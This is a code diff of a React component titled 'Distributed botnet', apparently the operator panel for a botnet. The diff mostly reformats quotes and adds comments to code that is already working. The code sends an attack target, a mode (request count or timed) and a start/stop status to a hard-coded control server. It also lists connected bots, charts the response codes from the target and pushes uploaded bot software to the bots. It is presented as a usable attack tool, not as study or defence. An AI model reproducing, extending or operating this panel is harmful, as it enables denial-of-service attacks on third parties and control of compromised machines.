@@ -1,44 +1,24 @@
-import React, { useState, useEffect, useRef } from "react";
-import { useNavigate } from "react-router-dom";
-import axios from "axios";
-import {
-  BarChart,
-  Bar,
-  XAxis,
-  YAxis,
-  CartesianGrid,
-  Tooltip,
-  ResponsiveContainer,
-} from "recharts";
-import {
-  FormControl,
-  FormLabel,
-  Switch,
-  Badge,
-  Button,
-  Input,
-  Code,
-  Radio,
-} from "@vechaiui/react";
+import React, { useState, useEffect, useRef } from 'react';
+import { useNavigate } from 'react-router-dom';
+import axios from 'axios';
+import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from 'recharts';
+import { FormControl, FormLabel, Switch, Badge, Button, Input, Code, Radio } from '@vechaiui/react';
 
 const Panel = () => {
   const navigate = useNavigate();
   const inputFileRef = useRef<HTMLInputElement>(null);
 
-  const serverUrl = "http://3.87.247.112:5000";
+  const serverUrl = 'http://3.87.247.112:5000';
 
   const [time, setTime] = useState(0);
-  const [serverTarget, setServerTarget] = useState("");
-  const [serverMode, setServerMode] = useState("");
-  const [serverTime, setServerTime] = useState("");
-  const [serverRequests, setServerRequests] = useState("");
-  const [type, setType] = useState(1);
-  const [inputValue, setInputValue] = useState(0);
+  const [serverTarget, setServerTarget] = useState('');
+  const [serverMode, setServerMode] = useState('');
+  const [serverTime, setServerTime] = useState('');
+  const [serverRequests, setServerRequests] = useState('');
   const [requestsNum, setRequestsNum] = useState(100);
   const [timeNum, setTimeNum] = useState(0);
   const [active, setActive] = useState(false);
-  const [running, setRunning] = useState(false);
-  const [target, setTarget] = useState("");
+  const [target, setTarget] = useState('');
   const [activeBots, setActiveBots] = useState([]);
   const [botsStats, setBotsStats] = useState([]);
   const [responses, setResponses] = useState<number[]>([]);
@@ -48,16 +28,23 @@ const Panel = () => {
   let intervalTimer: NodeJS.Timer;
   let intervalActivity: NodeJS.Timer;
 
+  /**
+   * Perform log out
+   */
   const logout = () => {
-    localStorage.removeItem("password");
-    navigate("/login");
+    localStorage.removeItem('password');
+    navigate('/login');
   };
 
+  /**
+   * Changing server status either to active (true) or disabled (false)
+   * @param serverUrl
+   * @param status
+   */
   const changeServerStatus = async (serverUrl: string, status: boolean) => {
-    const changeServerStatusEndpoint: string = "/setServerStatus";
-
+    const changeServerStatusEndpoint: string = '/setServerStatus';
     const statusObject = {
-      status: status,
+      status: status
     };
 
     try {
@@ -65,112 +52,125 @@ const Panel = () => {
       setActive(status);
     } catch (err) {
       console.log({
-        message: "Status setting failed.",
-        errorInfo: err,
+        message: 'Status setting failed.',
+        errorInfo: err
       });
     }
   };
 
+  /**
+   * Set the requests amount on the server (for Requests amount mode)
+   * @param requestsNum
+   */
   const setRequestsNumber = async (requestsNum: number) => {
-    const setRequestsNumberEndpoint: string = "/setRequestsNumber";
-
+    const setRequestsNumberEndpoint: string = '/setRequestsNumber';
     const requestsNumObject = {
-      requestsNumber: requestsNum,
+      requestsNumber: requestsNum
     };
 
     try {
-      await axios.post(
-        serverUrl + setRequestsNumberEndpoint,
-        requestsNumObject
-      );
+      await axios.post(serverUrl + setRequestsNumberEndpoint, requestsNumObject);
     } catch (err) {
       console.log({
-        message: "Requests number setting failed.",
-        errorInfo: err,
+        message: 'Requests number setting failed.',
+        errorInfo: err
       });
     }
   };
 
+  /**
+   * Set the amount of time (in seconds) to perform attack (for Timed attack mode)
+   * @param time
+   */
   const setTimeSeconds = async (time: number) => {
-    const setTimeSecondsEndpoint: string = "/setTimeSeconds";
-
+    const setTimeSecondsEndpoint: string = '/setTimeSeconds';
     const timeSecondsObject = {
-      timeSeconds: time,
+      timeSeconds: time
     };
 
     try {
       await axios.post(serverUrl + setTimeSecondsEndpoint, timeSecondsObject);
     } catch (err) {
       console.log({
-        message: "Requests number setting failed.",
-        errorInfo: err,
+        message: 'Requests number setting failed.',
+        errorInfo: err
       });
     }
   };
 
+  /**
+   * Set the attack mode on server (either 2 - timeMode or 1 – requestMode)
+   * @param mode
+   */
   const setMode = async (mode: number) => {
-    setType(mode);
-    const setModeEndpoint: string = "/setMode";
-
+    const setModeEndpoint: string = '/setMode';
     const modeObject = {
-      mode: mode === 2 ? "timeMode" : "requestMode",
+      mode: mode === 2 ? 'timeMode' : 'requestMode'
     };
 
     try {
       await axios.post(serverUrl + setModeEndpoint, modeObject);
     } catch (err) {
       console.log({
-        message: "Number setting failed.",
-        errorInfo: err,
+        message: 'Number setting failed.',
+        errorInfo: err
       });
     }
   };
 
+  /**
+   * Set the target to perform attack on
+   * @param serverUrl
+   * @param target
+   */
   const changeTarget = async (serverUrl: string, target: string) => {
-    const changeTargetEndpoint: string = "/changeTarget";
-
+    const changeTargetEndpoint: string = '/changeTarget';
     const targetObject = {
-      target: target,
+      target: target
     };
 
     try {
       await axios.post(serverUrl + changeTargetEndpoint, targetObject);
     } catch (err) {
       console.log({
-        message: "Target setting failed.",
-        errorInfo: err,
+        message: 'Target setting failed.',
+        errorInfo: err
       });
     }
   };
 
+  /**
+   * Get all the bots that have been connected during the server's working session
+   * @param serverUrl
+   */
   const getActiveBots = async (serverUrl: string) => {
-    const getActiveBotsEndpoint = "/getConnectedBots";
+    const getActiveBotsEndpoint = '/getConnectedBots';
     try {
       const response = await axios.get(serverUrl + getActiveBotsEndpoint);
       const responseData = response.data;
       const { connectedBots } = responseData;
 
       setActiveBots(connectedBots);
-      console.log(responseData);
     } catch (err) {
       console.log(err);
     }
   };
 
+  /**
+   * Get statistics from the bots connected no longer then 10 minutes ago
+   * @param serverUrl
+   * @param responses
+   */
   const getBotsStats = async (serverUrl: string, responses: number[]) => {
-    const getBotsStatsEndpoint = "/getBotsStats";
+    const getBotsStatsEndpoint = '/getBotsStats';
     try {
+      const statusCodes: number[] = [];
       const response = await axios.get(serverUrl + getBotsStatsEndpoint);
       const responseData = response.data;
 
       setBotsStats(responseData.stats.reverse());
-      console.log(responseData.stats);
-      const statusCodes: number[] = [];
       responseData.stats.forEach((resp: any) => {
-        if (
-          new Date().getTime() - new Date(resp.ResponseTime).getTime() <
-          10000000
-        ) {
+        if (new Date().getTime() - new Date(resp.ResponseTime).getTime() < 10000000) {
           statusCodes.push(...resp.Status);
         }
       });
@@ -181,69 +181,80 @@ const Panel = () => {
     }
   };
 
+  /**
+   * Parse the list of response codes and form an object for graph representation
+   * @param responseList
+   */
   const parseStatsData = (responseList: number[]) => {
     const data: {
       statusCode: string;
       amount: number;
     }[] = [];
+    const countCodes = responseList.reduce((acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc), {});
 
-    const countCodes = responseList.reduce(
-      (acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc),
-      {}
-    );
     for (const status of Object.keys(countCodes)) {
       data.push({
         statusCode: status,
-        amount: countCodes[status],
+        amount: countCodes[status]
       });
     }
-
     return data;
   };
 
-  const startBotnet = (
-    serverUrl: string,
-    requestsNum: number,
-    time: number,
-    target: string
-  ) => {
-    setRunning(true);
+  /**
+   * Start the botnet
+   * @param serverUrl
+   * @param requestsNum
+   * @param time
+   * @param target
+   */
+  const startBotnet = (serverUrl: string, requestsNum: number, time: number, target: string) => {
     setResponses([]);
     changeServerStatus(serverUrl, true);
     changeTarget(serverUrl, target);
     getActiveBots(serverUrl);
   };
 
+  /**
+   * Stop the botnet
+   * @param serverUrl
+   */
   const stopBotnet = (serverUrl: string) => {
     changeServerStatus(serverUrl, false);
     setTime(0);
-    setRunning(false);
     setActiveBots([]);
     setBotsStats([]);
   };
 
+  /**
+   * Upload a software file
+   * @param file
+   */
   const uploadFile = async (file: any) => {
+    const uploadFileEndpoint = '/uploadFile';
     const formData = new FormData();
-    formData.append("file", file);
-    const uploadFileEndpoint = "/uploadFile";
+    formData.append('file', file);
+
     try {
-      const response = await axios.post(
-        serverUrl + uploadFileEndpoint,
-        formData
-      );
+      const response = await axios.post(serverUrl + uploadFileEndpoint, formData);
       return response.data.filepath;
     } catch (e) {
       console.error(e);
     }
   };
 
+  /**
+   * Perform software update from the file uploaded
+   * @param selectedFile
+   */
   const updateSoftware = async (selectedFile: any) => {
     const link = await uploadFile(selectedFile);
-    const updateSoftwareEndpoint = "/setBotVersionInfo";
+    const updateSoftwareEndpoint = '/setBotVersionInfo';
     const softwareObject = {
       botVersionName: selectedFile.name.split('.')[0],
-      botFileUrl: link,
+      botFileUrl: link
     };
+
     try {
       await axios.post(serverUrl + updateSoftwareEndpoint, softwareObject);
     } catch (e) {
@@ -251,37 +262,52 @@ const Panel = () => {
     }
   };
 
+  /**
+   * Auxiliary event handler for software update
+   * @param event
+   */
   const changeHandler = (event: any) => {
     updateSoftware(event.target.files[0]);
   };
 
+  /**
+   * Get server information (mode, target, time / requests)
+   */
   const getServerInfo = async (serverUrl: string) => {
-    const getTargetInfoEndoint = "/getTargetInfo";
+    const getTargetInfoEndpoint = '/getTargetInfo';
+
     try {
-      const response = await axios.get(serverUrl + getTargetInfoEndoint);
+      const response = await axios.get(serverUrl + getTargetInfoEndpoint);
       const responseData = response.data;
+
       setServerMode(responseData.mode);
       setServerTarget(responseData.targetUrl);
       setServerTime(responseData.timeSeconds);
       setServerRequests(responseData.requestNum);
-      console.log(responseData);
     } catch (err) {
       console.error(err);
     }
   };
 
+  /**
+   * Getting server information each 3000 milliseconds
+   */
   useEffect(() => {
     setInterval(() => {
       getServerInfo(serverUrl);
     }, 3000);
   }, []);
 
+  /**
+   * Timer-dependent operations
+   */
   useEffect(() => {
+    // Increasing the timer value each 10 milliseconds
     if (active) {
       intervalTimer = setInterval(() => {
         setTime((prevTime) => prevTime + 10);
       }, 10);
-
+      // Getting bots connected and their stats each 10000 milliseconds
       intervalActivity = setInterval(() => {
         getActiveBots(serverUrl);
         getBotsStats(serverUrl, responses);
@@ -297,9 +323,12 @@ const Panel = () => {
     };
   }, [active]);
 
+  /**
+   * Forwarding user to the login page in case he / she is not logged in
+   */
   useEffect(() => {
-    if (!localStorage.getItem("password")) {
-      navigate("/login");
+    if (!localStorage.getItem('password')) {
+      navigate('/login');
     } else {
       setVisible(true);
     }
@@ -312,18 +341,16 @@ const Panel = () => {
       <div className="mt-8 mx-20 mb-10 ">
         <div className="flex justify-between">
           <div className="w-full flex flex-col">
-            <h1 className="text-3xl font-bold text-gray-700">
-              Distributed botnet
-            </h1>
+            <h1 className="text-3xl font-bold text-gray-700">Distributed botnet</h1>
             <p className="text-gray-400 mb-8">version 2.0.1</p>
           </div>
           <Button className="mt-2" onClick={logout}>
             Exit
           </Button>
         </div>
-        <div style={{ height: "75vh" }} className="w-full flex">
+        <div style={{ height: '75vh' }} className="w-full flex">
           <div className="flex flex-col w-1/2">
-            <div style={{ height: "40%" }} className="mb-5">
+            <div style={{ height: '40%' }} className="mb-5">
               <p className="text-gray-500 text-base mb-3">Give the target:</p>
               <div className="w-5/6">
                 <Input
@@ -334,9 +361,7 @@ const Panel = () => {
                 />
               </div>
               <div className="flex items-center gap-5 w-5/6 mt-8">
-                <p className="text-sm font-bold text-gray-800 mr-2">
-                  Choose mode:
-                </p>
+                <p className="text-sm font-bold text-gray-800 mr-2">Choose mode:</p>
                 <Radio
                   name="basic"
                   defaultChecked
@@ -357,34 +382,22 @@ const Panel = () => {
               </div>
               <div className="flex gap-5 mt-3 mb-3 items-center ">
                 <FormControl id="email" className=" flex flex-col ">
-                  <FormLabel>{"Requests amount"}</FormLabel>
+                  <FormLabel>{'Requests amount'}</FormLabel>
                   <Input
                     placeholder="> 100"
                     onChange={(e) => {
-                      setRequestsNum(
-                        isNaN(parseInt(e.target.value))
-                          ? 0
-                          : parseInt(e.target.value)
-                      );
+                      setRequestsNum(isNaN(parseInt(e.target.value)) ? 0 : parseInt(e.target.value));
                     }}
                     required
                   />
                 </FormControl>
                 <FormControl id="email" className=" flex flex-col ">
-                  <FormLabel>{"Time amount (sec)"}</FormLabel>
+                  <FormLabel>{'Time amount (sec)'}</FormLabel>
                   <Input
                     placeholder="20"
                     onChange={(e) => {
-                      setTimeNum(
-                        isNaN(parseInt(e.target.value))
-                          ? 0
-                          : parseInt(e.target.value)
-                      );
-                      setTime(
-                        isNaN(parseInt(e.target.value))
-                          ? 0
-                          : parseInt(e.target.value) * 1000
-                      );
+                      setTimeNum(isNaN(parseInt(e.target.value)) ? 0 : parseInt(e.target.value));
+                      setTime(isNaN(parseInt(e.target.value)) ? 0 : parseInt(e.target.value) * 1000);
                     }}
                     required
                   />
@@ -444,11 +457,7 @@ const Panel = () => {
 
               {botsStats.length !== 0
                 ? botsStats.map((response: any) => {
-                    if (
-                      new Date().getTime() -
-                        new Date(response.ResponseTime).getTime() <
-                      100000
-                    ) {
+                    if (new Date().getTime() - new Date(response.ResponseTime).getTime() < 100000) {
                       return (
                         <Code className="flex flex-col justify-start items-start">
                           <p>TIME: {response.ResponseTime}</p>
@@ -458,7 +467,7 @@ const Panel = () => {
                       );
                     }
                   })
-                : "No information retrieved yet"}
+                : 'No information retrieved yet'}
             </div>
           </div>
           <div className="flex-col w-1/2">
@@ -476,26 +485,18 @@ const Panel = () => {
                   }}
                 >
                   Upload bot software
-                  <input
-                    ref={inputFileRef}
-                    type={"file"}
-                    onChange={changeHandler}
-                  />
+                  <input ref={inputFileRef} type={'file'} onChange={changeHandler} />
                 </Button>
               </div>
               <div>
                 {activeBots.length !== 0 ? (
                   activeBots.map((bot: string) => (
                     <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
-                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
-                        {bot}
-                      </p>
+                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">{bot}</p>
                     </div>
                   ))
                 ) : (
-                  <p className="text-gray-400  font-normal mt-5 text-center">
-                    No bots connected
-                  </p>
+                  <p className="text-gray-400  font-normal mt-5 text-center">No bots connected</p>
                 )}
               </div>
             </div>
@@ -511,23 +512,15 @@ const Panel = () => {
                       top: 5,
                       right: 30,
                       left: 20,
-                      bottom: 25,
+                      bottom: 25
                     }}
                     barSize={30}
                   >
-                    <XAxis
-                      dataKey="statusCode"
-                      scale="point"
-                      padding={{ left: 10, right: 10 }}
-                    />
+                    <XAxis dataKey="statusCode" scale="point" padding={{ left: 10, right: 10 }} />
                     <YAxis />
                     <Tooltip />
                     <CartesianGrid strokeDasharray="3 3" />
-                    <Bar
-                      dataKey="amount"
-                      fill="#14B8A6"
-                      background={{ fill: "#eee" }}
-                    />
+                    <Bar dataKey="amount" fill="#14B8A6" background={{ fill: '#eee' }} />
                   </BarChart>
                 </ResponsiveContainer>
               )}
@@ -538,9 +531,7 @@ const Panel = () => {
       <div className="h-20 w-full fixed bottom-0 flex items-center justify-around bg-gray-100">
         <div className=" flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Target:</p>
-          <p className="text-gray-600 text-sm font-medium">
-            {serverTarget ? serverTarget : "Not defined"}
-          </p>
+          <p className="text-gray-600 text-sm font-medium">{serverTarget ? serverTarget : 'Not defined'}</p>
         </div>
         <div className=" flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Status:</p>
@@ -550,36 +541,31 @@ const Panel = () => {
             <p className="text-red-400 text-sm font-medium">Disabled</p>
           )}
         </div>
-        <div className=" flex flex-row gap-1">
+        <div className="flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Requests sent:</p>
-          <p className="text-gray-700 text-sm font-medium">
-            {responses.length}
-          </p>
+          <p className="text-gray-700 text-sm font-medium">{responses.length}</p>
         </div>
-        <div className=" flex flex-row gap-1">
+        <div className="flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Requests:</p>
           <p className="text-gray-700 text-sm font-medium">{serverRequests}</p>
         </div>
-        <div className=" flex flex-row gap-1">
+        <div className="flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Time:</p>
           <p className="text-gray-700 text-sm font-medium">{serverTime}</p>
         </div>
-        <div className=" flex flex-row gap-1">
+        <div className="flex flex-row gap-1">
           <p className="text-gray-400 text-sm ">Mode:</p>
           <p className="text-gray-700 text-sm font-medium">{serverMode}</p>
         </div>
-        <div className=" flex flex-row gap-1">
-          <p className="text-gray-400 text-sm flex items-center">
-            Time elapsed:
-          </p>
+        <div className="flex flex-row gap-1">
+          <p className="text-gray-400 text-sm flex items-center">Time elapsed:</p>
           <p className="text-4xl font-bold text-gray-600 bottom-0">
             <div className="numbers">
-              <span>{("0" + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
-              <span>{("0" + Math.floor((time / 1000) % 60)).slice(-2)}</span>
+              <span>{('0' + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
+              <span>{('0' + Math.floor((time / 1000) % 60)).slice(-2)}</span>
             </div>
           </p>
         </div>
-
         <Button
           onClick={() => {
             stopBotnet(serverUrl);
